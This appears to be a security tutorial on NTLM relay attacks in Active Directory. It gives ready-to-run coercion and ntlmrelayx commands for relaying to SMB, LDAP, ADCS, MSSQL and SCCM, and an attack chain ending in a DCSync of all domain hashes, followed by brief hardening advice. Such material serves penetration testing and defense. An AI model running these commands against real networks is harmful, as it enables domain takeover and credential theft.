---
title: "NTLM Relay Attacks: A Comprehensive Guide"
description: "Everything about NTLM relay - from theory to exploitation. Covering relay to SMB, LDAP, MSSQL, ADCS HTTP, and SCCM with practical tooling and real-world attack chains."
date: 2026-02-18
difficulty: Hard
tags: [ntlm-relay, coercion, petitpotam, smb-signing, active-directory]
---

## NTLM Authentication Basics

NTLM is a challenge-response protocol. The server sends a challenge, the client hashes its password with the challenge and sends the response. The vulnerability: the client never verifies it's talking to the intended server. An attacker can sit in the middle, receive the client's response, and **relay** it to a different server.

```
Victim → Attacker: "I want to authenticate" (NTLM Negotiate)
Attacker → Target: "I want to authenticate" (forwarded)
Target → Attacker: Challenge
Attacker → Victim: Challenge (forwarded)
Victim → Attacker: Response (hash of password + challenge)
Attacker → Target: Response (forwarded) → AUTHENTICATED
```

## Step 1: Coerce Authentication

You need the victim to send NTLM authentication to you. Methods:

### PetitPotam (MS-EFSRPC)

```bash
# Coerce DC to authenticate to your listener
python3 PetitPotam.py listener_ip dc01.corp.local
```

### PrinterBug (MS-RPRN)

```bash
# Requires credentials but works reliably
python3 printerbug.py corp.local/jsmith:'Pass1'@dc01 listener_ip
```

### DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u jsmith -p 'Pass1' -d corp.local listener_ip dc01
```

### Other Coercion Methods

| Method | Protocol | Requires Creds | Patched |
|---|---|:---:|:---:|
| PetitPotam | MS-EFSRPC | No (unauthenticated) | Partially |
| PrinterBug | MS-RPRN | Yes | No |
| DFSCoerce | MS-DFSNM | Yes | No |
| ShadowCoerce | MS-FSRVP | Yes | No |
| CoerceChocolatine | MS-EVEN | Yes | No |

## Step 2: Choose Your Relay Target

### Relay to SMB (→ Code Execution)

If SMB signing is not required on the target, relay to get a shell:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe
# Or interactive shell
ntlmrelayx.py -tf targets.txt -smb2support -i
```

**Limitation**: You cannot relay SMB authentication back to the same host (MS08-068 mitigation).

### Relay to LDAP (→ AD Manipulation)

If LDAP signing is not enforced, relay to create machine accounts, modify ACLs, or configure RBCD:

```bash
# RBCD attack via LDAP relay
ntlmrelayx.py -t ldap://dc02.corp.local --delegate-access
# Creates machine account + sets RBCD on the coerced computer
```

### Relay to ADCS HTTP (→ Certificate Theft)

The AD CS web enrollment endpoint accepts NTLM by default. Relay a DC's authentication to get a certificate:

```bash
# ESC8: Relay to ADCS HTTP enrollment
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Output: Base64 certificate for the relayed machine account

# Authenticate with the certificate
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# → DC01$ TGT → DCSync
```

### Relay to MSSQL (→ SQL Execution)

```bash
ntlmrelayx.py -t mssql://sql01.corp.local -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```

### Relay to SCCM (→ Site Server Takeover)

If SCCM doesn't enforce HTTPS-only:

```bash
ntlmrelayx.py -t http://sccm.corp.local/ccm_system_windowsauth/request --sccm
```

## Checking Protections

Before attempting relay, verify the target isn't protected:

```bash
# Check SMB signing
crackmapexec smb targets.txt --gen-relay-list unsigning.txt

# Check LDAP signing/channel binding
crackmapexec ldap dc01 -u jsmith -p 'Pass1' -M ldap-checker
```

## Full Attack Chain Example

### Scenario: Unprivileged user → Domain Admin via NTLM relay

```
1. Enumerate: Find DC01 (LDAP signing not enforced), CA01 (ADCS HTTP enrollment)
2. Set up: ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp --adcs --template Machine
3. Coerce: PetitPotam.py listener dc01.corp.local
4. Relay: DC01$ authenticates → relayed to CA01 → certificate issued for DC01$
5. Auth: certipy auth -pfx dc01.pfx → DC01$ TGT
6. DCSync: secretsdump.py corp.local/DC01$@dc01 -k -no-pass → All domain hashes
```

This chain goes from **zero credentials** (unauthenticated PetitPotam) to **full domain compromise** in under 5 minutes.

## Defense

| Protection | What It Prevents |
|---|---|
| SMB Signing (Required) | Relay to SMB |
| LDAP Signing + Channel Binding | Relay to LDAP |
| EPA on ADCS HTTP | Relay to certificate enrollment |
| Disable NTLM | All relay attacks |
| Network segmentation | Limits coercion paths |

### Quick Wins
```powershell
# Require SMB signing on all servers
Set-SmbServerConfiguration -RequireSecuritySignature $true

# Enable LDAP signing
# Set "LDAP server signing requirements" to "Require signing" in GPO

# Enable EPA on ADCS
# Set Extended Protection to "Required" on IIS ADCS site
```

> NTLM relay remains one of the most devastating attack techniques in Active Directory because the default configuration of most services allows it. A single unprotected relay path can lead to complete domain compromise.
